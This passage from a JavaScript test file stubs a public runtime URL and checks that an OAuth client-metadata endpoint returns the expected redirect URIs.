    vi.stubEnv("PAPERCLIP_MANAGED_RUNTIME_PUBLIC_URL", "https://inferred.tail29c1aa.ts.net");
    const app = createRouteApp(db);

    const response = await request(app).get("/api/tools/oauth/client-metadata").expect(200);

    expect(response.body.redirect_uris).toEqual([REDIRECT_URI]);
  });
});
